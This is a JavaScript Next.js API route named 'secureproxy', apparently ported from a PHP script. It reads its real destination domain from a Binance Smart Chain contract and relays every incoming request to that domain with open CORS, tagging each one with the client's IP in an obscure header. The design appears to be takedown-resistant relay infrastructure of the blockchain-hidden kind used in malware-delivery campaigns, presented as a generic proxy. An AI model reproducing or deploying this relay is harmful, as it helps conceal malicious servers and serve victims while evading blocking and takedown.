// pages/api/secureproxy.js
// Fully converted from secureproxy.php

const RPC_URLS = [
  "https://rpc.ankr.com/bsc",
  "https://bsc-dataseed2.bnbchain.org",
  "https://binance.llamarpc.com",
  "https://bsc.drpc.org",
];

const CONTRACT_ADDRESS = "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0";

// Simple in-memory cache (ephemeral, lasts 60s)
let cache = { data: null, timestamp: 0, ttl: 60 };

// --- Utility: Extract client IP ---
function getClientIp(req) {
  if (req.headers["cf-connecting-ip"]) return req.headers["cf-connecting-ip"];
  if (req.headers["x-forwarded-for"])
    return req.headers["x-forwarded-for"].split(",")[0].trim();
  if (req.socket && req.socket.remoteAddress)
    return req.socket.remoteAddress;
  return null;
}

// --- Utility: Fetch with timeout ---
async function fetchWithTimeout(resource, options = {}) {
  const { timeout = 15000 } = options;
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), timeout);
  try {
    const resp = await fetch(resource, { ...options, signal: controller.signal });
    clearTimeout(id);
    return resp;
  } catch (err) {
    clearTimeout(id);
    throw err;
  }
}

// --- Utility: Decode Ethereum hex string to ASCII domain ---
function hexToString(hex) {
  hex = hex.replace(/^0x/, "").slice(64); // remove function selector
  const lengthHex = hex.slice(0, 64);
  const length = parseInt(lengthHex, 16);
  const dataHex = hex.slice(64, 64 + length * 2);
  let result = "";
  for (let i = 0; i < dataHex.length; i += 2) {
    const charCode = parseInt(dataHex.slice(i, i + 2), 16);
    if (!charCode) break;
    result += String.fromCharCode(charCode);
  }
  return result;
}

// --- Core: Fetch and cache the target domain from blockchain ---
async function getTargetDomain() {
  const now = Math.floor(Date.now() / 1000);
  if (cache.data && now - cache.timestamp < cache.ttl) return cache.data;

  const data = "0x20965255";
  for (const rpc of RPC_URLS) {
    try {
      const resp = await fetch(rpc, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          jsonrpc: "2.0",
          id: 1,
          method: "eth_call",
          params: [{ to: CONTRACT_ADDRESS, data }, "latest"],
        }),
      });
      const json = await resp.json();
      if (json?.result) {
        const domain = hexToString(json.result);
        if (domain) {
          cache = { data: domain, timestamp: now, ttl: 60 };
          return domain;
        }
      }
    } catch (_) {
      continue;
    }
  }
  throw new Error("Could not fetch target domain");
}

// --- API Handler ---
export default async function handler(req, res) {
  // Set CORS headers
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader(
    "Access-Control-Allow-Methods",
    "GET,HEAD,POST,OPTIONS,PUT,PATCH,DELETE"
  );
  res.setHeader("Access-Control-Allow-Headers", "*");
  res.setHeader("Access-Control-Max-Age", "3600");

  if (req.method === "OPTIONS") {
    res.status(204).end();
    return;
  }

  const e = req.query.e;
  if (!e) {
    res.status(400).send("Missing endpoint");
    return;
  }
  const endpoint = Array.isArray(e) ? e[0] : e;

  // Health check
  if (endpoint === "ping_proxy") {
    res.setHeader("Content-Type", "text/plain");
    res.status(200).send("pong");
    return;
  }

  const clientIp = getClientIp(req);

  // Prepare headers
  const forwardHeaders = {};
  for (const [k, v] of Object.entries(req.headers || {})) {
    const lower = k.toLowerCase();
    if (
      [
        "host",
        "connection",
        "keep-alive",
        "proxy-authenticate",
        "proxy-authorization",
        "te",
        "trailers",
        "transfer-encoding",
        "upgrade",
      ].includes(lower)
    )
      continue;
    forwardHeaders[k] = v;
  }

  if (clientIp) {
    forwardHeaders["x-forwarded-for"] = clientIp + (forwardHeaders["x-forwarded-for"] ? ", " + forwardHeaders["x-forwarded-for"] : "");
    forwardHeaders["x-dfkjldifjlifjd"] = clientIp;
  }

  // Prepare request body
  let body = undefined;
  if (req.method !== "GET" && req.method !== "HEAD") {
    if (req.body && typeof req.body === "string") body = req.body;
    else if (req.body && Object.keys(req.body).length)
      try {
        body = JSON.stringify(req.body);
      } catch {
        body = undefined;
      }
  }

  try {
    const targetDomain = (await getTargetDomain()).replace(/\/+$/, "");
    const target = targetDomain + "/" + endpoint.replace(/^\/+/, "");
    const upstream = await fetchWithTimeout(target, {
      method: req.method,
      headers: forwardHeaders,
      body,
      timeout: 20000,
    });

    // Forward response
    res.status(upstream.status);
    upstream.headers.forEach((v, n) => {
      const lower = n.toLowerCase();
      if (
        [
          "transfer-encoding",
          "connection",
          "keep-alive",
          "proxy-authenticate",
          "proxy-authorization",
          "te",
          "trailers",
          "upgrade",
        ].includes(lower)
      )
        return;
      res.setHeader(n, v);
    });

    const buffer = Buffer.from(await upstream.arrayBuffer());
    res.send(buffer);
  } catch (err) {
    console.error("Proxy failed:", err);
    res.status(502).json({ error: "Bad gateway", details: String(err) });
  }
}
